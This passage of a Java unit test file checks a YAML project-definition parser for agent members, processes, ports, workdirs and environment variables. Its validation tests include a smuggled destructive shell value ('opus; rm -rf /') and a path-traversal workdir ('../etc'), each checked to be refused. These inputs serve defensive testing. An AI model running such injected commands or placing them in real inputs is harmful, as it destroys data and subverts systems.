  void aDefinitionNamingNoAgentHasNoMember() {
    var config =
        ProjectDefinition.fromMap(YamlUtil.parseMap("name: acme\nagent:\n  auto_branch: true\n"));

    assertNull(config.agent().projectMember());
  }

  @Test
  void aMemberBlockWithNoAgentToFallBackOnIsRefused() {
    var yaml = "name: acme\nagent:\n  member:\n    model: gpt-5-codex\n";

    assertEquals(
        "agent.member.agent in acme/sail.yaml is unset and agent.type names no agent. Set one of"
            + " them.",
        refusal(yaml));
  }

  @Test
  void aMemberWithAnUnknownModeOrAnUnsafeModelIsRefused() {
    var base = "name: acme\nagent:\n  type: claude-code\n  member:\n";

    assertEquals(
        "agent.member.mode in acme/sail.yaml: Engagement mode must be 'full' or 'read_only', got"
            + " 'admin'.",
        refusal(base + "    mode: admin\n"));
    assertEquals(
        "agent.member.model 'opus; rm -rf /' in acme/sail.yaml is not a model id. Use one without"
            + " spaces or shell syntax.",
        refusal(base + "    model: 'opus; rm -rf /'\n"));
  }

  @Test
  void aMembersLegacyReadOnlySpellingReadsAsTheWireForm() {
    var config =
        ProjectDefinition.fromMap(
            YamlUtil.parseMap(
                "name: acme\nagent:\n  type: claude-code\n  member:\n    mode: read-only\n"));

    assertEquals("read_only", config.agent().projectMember().mode());
  }

  @Test
  void aBlankMemberFallsBackToEveryDefault() {
    var config =
        ProjectDefinition.fromMap(
            YamlUtil.parseMap(
                "name: acme\nagent:\n  type: codex\n  member:\n    agent: ''\n    model: ''\n"));

    assertEquals(
        new ProjectDefinition.Member("codex", null, "full"), config.agent().projectMember());
  }

  @Test
  void installsFallBackToTheAgentType() {
    var none = new ProjectDefinition.Agent(null, false, null, false, null, null, null, null);
    var empty =
        new ProjectDefinition.Agent("codex", false, null, false, List.of(), null, null, null);

    assertEquals(List.of(), none.installs());
    assertEquals(List.of("codex"), empty.installs());
  }

  private static ProjectDefinition withProcesses(String processes) {
    return ProjectDefinition.fromMap(
        YamlUtil.parseMap(
            "name: acme\nservices:\n  postgres:\n    image: postgres:16\n    ports: [5432]\nprocesses:\n"
                + processes));
  }

  private static String processRefusal(String processes) {
    return assertThrows(IllegalArgumentException.class, () -> withProcesses(processes))
        .getMessage();
  }

  @Test
  void aProcessDeclaresTheCommandItsWorkdirThePortItListensOnAndItsEnvironment() {
    var config =
        withProcesses(
            """
              web:
                command: npm run dev
                workdir: app/web
                port: 3000
                env:
                  NODE_ENV: development
                  WORKERS: 2
              worker:
                command: node worker.js
            """);

    var web = config.processes().get("web");
    assertEquals(
        new ProjectDefinition.Process(
            "npm run dev", "app/web", 3000, Map.of("NODE_ENV", "development", "WORKERS", "2")),
        web);
    assertEquals(
        new ProjectDefinition.Process("node worker.js", null, null, Map.of()),
        config.processes().get("worker"));
    assertEquals(config, ProjectDefinition.fromMap(config.toMap()), "it survives a round trip");
    assertEquals(Map.of("command", "node worker.js"), config.processes().get("worker").toMap());
  }

  @Test
  void aWorkdirIsAPathUnderTheWorkspaceWithOrWithoutDotSlash() {
    assertEquals("", ProjectDefinition.Process.inWorkspace("."));
    assertEquals("", ProjectDefinition.Process.inWorkspace("./"));
    assertEquals("webapp", ProjectDefinition.Process.inWorkspace("./webapp"));
    assertEquals("a/b", ProjectDefinition.Process.inWorkspace("././a/b"));
    assertEquals("a/b", ProjectDefinition.Process.inWorkspace("a/b"));
  }

  @Test
  void aPortIsClaimedByOneProcessOrServiceOnly() {
    assertEquals(
        "Port 5432 is claimed by both service 'postgres' and process 'web'. Give one of them another"
            + " port.",
        processRefusal("  web:\n    command: x\n    port: 5432\n"));
    assertEquals(
        "Port 3000 is claimed by both process 'web' and process 'admin'. Give one of them another"
            + " port.",
        processRefusal(
            "  web:\n    command: x\n    port: 3000\n  admin:\n    command: y\n    port: 3000\n"));
  }

  @Test
  void aProcessThatCannotRunAsDeclaredIsRefusedNamingItsField() {
    assertEquals(
        "processes.web.command is required: the command that starts it.",
        processRefusal("  web:\n    port: 3000\n"));
    assertEquals(
        "processes.web.command is required: the command that starts it.",
        processRefusal("  web:\n    command: \"  \"\n"));
    assertEquals(
        "processes.web.port must be a whole number from 1024 to 65535, got: 80",
        processRefusal("  web:\n    command: x\n    port: 80\n"));
    assertEquals(
        "processes.web.port must be a whole number from 1024 to 65535, got: 70000",
        processRefusal("  web:\n    command: x\n    port: 70000\n"));
    assertEquals(
        "processes.web.port must be a whole number from 1024 to 65535, got: 3000a",
        processRefusal("  web:\n    command: x\n    port: 3000a\n"));
    assertEquals(
        "Invalid processes.web.workdir: '../etc'. Must match [a-zA-Z0-9][a-zA-Z0-9._/-]* with no"
            + " '..' segments.",
        processRefusal("  web:\n    command: x\n    workdir: ../etc\n"));
    assertEquals(
        "processes.web.workdir must be text when set.",
        processRefusal("  web:\n    command: x\n    workdir: 3\n"));
    assertEquals(
        "processes.web.env has the name '1X'; a name is letters, digits and _, not starting with a"
            + " digit.",
        processRefusal("  web:\n    command: x\n    env:\n      1X: a\n"));
    assertEquals(
        "processes.web.env.LIST must be a single value.",
        processRefusal("  web:\n    command: x\n    env:\n      LIST: [a, b]\n"));
    assertEquals(
        "processes.web.env must be a map of names to values.",
        processRefusal("  web:\n    command: x\n    env: [a]\n"));
    assertEquals(
        "Invalid process name: 'my app'. Must match [a-zA-Z0-9][a-zA-Z0-9._-]*, max 63 characters.",
        processRefusal("  my app:\n    command: x\n"));
  }
}
